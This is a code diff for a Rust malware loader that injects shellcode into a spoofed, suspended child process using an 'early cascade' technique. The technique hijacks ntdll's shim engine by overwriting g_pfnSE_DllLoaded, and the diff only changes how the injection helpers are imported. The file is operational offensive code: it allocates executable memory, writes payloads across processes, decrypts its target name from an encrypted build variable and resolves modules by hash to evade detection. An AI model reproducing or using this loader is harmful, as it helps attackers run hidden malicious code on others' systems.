@@ -1,5 +1,5 @@
 use crate::syscall::common::env::get_loaded_module_by_hash;
-use crate::api::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
+use crate::ntapi::*;
 
 mod stub;
 
@@ -14,7 +14,7 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
     let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));
 
     // 1. Create Process in Suspended State
-    let process_info = crate::api::create_process_with_spoofing(target_program.as_str(), true)?;
+    let process_info = create_process_with_spoofing(target_program.as_str(), true)?;
 
     // 2. Prepare Cascade Stub
     let cascade_stub = stub::get_stub();
@@ -22,7 +22,7 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
     
     // 3. Allocate Memory in Target Process
     let total_len = cascade_stub.len() + shellcode_len;
-    let remote_mem = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, total_len, PAGE_EXECUTE_READWRITE)?;
+    let remote_mem = alloc_virtual_memory_at(process_info.hProcess, 0, total_len, PAGE_EXECUTE_READWRITE)?;
 
     // 4. Resolve ntdll sections
     let ntdll_hash = crate::dbj2_hash!(b"ntdll.dll");
@@ -52,27 +52,27 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
     cascade_stub[49..57].copy_from_slice(&nt_queue_apc_thread.to_le_bytes());
 
     // 6. Write Stub and Payload
-    crate::api::write_virtual_memory(process_info.hProcess, remote_mem, &cascade_stub)?;
+    write_virtual_memory(process_info.hProcess, remote_mem, &cascade_stub)?;
     
     let shellcode_slice = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
-    crate::api::write_virtual_memory(process_info.hProcess, payload_addr, shellcode_slice)?;
+    write_virtual_memory(process_info.hProcess, payload_addr, shellcode_slice)?;
 
     // 7. Enable Shims (Write 1 to g_ShimsEnabled)
     let shim_enabled_val: u8 = 1;
     
-    crate::api::write_virtual_memory(process_info.hProcess, g_shims_enabled, &[shim_enabled_val])?;
+    write_virtual_memory(process_info.hProcess, g_shims_enabled, &[shim_enabled_val])?;
 
     // 8. Overwrite g_pfnSE_DllLoaded
     // First change protection to RW
-    let _old_prot = crate::api::protect_virtual_memory(process_info.hProcess, g_pfn_se_dll_loaded, std::mem::size_of::<usize>(), PAGE_READWRITE)?;
+    let _old_prot = protect_virtual_memory(process_info.hProcess, g_pfn_se_dll_loaded, std::mem::size_of::<usize>(), PAGE_READWRITE)?;
     
     // Encode pointer to our stub
     let encoded_ptr = crate::utils::sys_encode_fn_pointer(remote_mem);
     
-    crate::api::write_virtual_memory(process_info.hProcess, g_pfn_se_dll_loaded, &encoded_ptr.to_le_bytes())?;
+    write_virtual_memory(process_info.hProcess, g_pfn_se_dll_loaded, &encoded_ptr.to_le_bytes())?;
     
     // 9. Resume Thread
-    crate::api::resume_thread(process_info.hThread)?;
+    resume_thread(process_info.hThread)?;
 
     Ok(())
 }
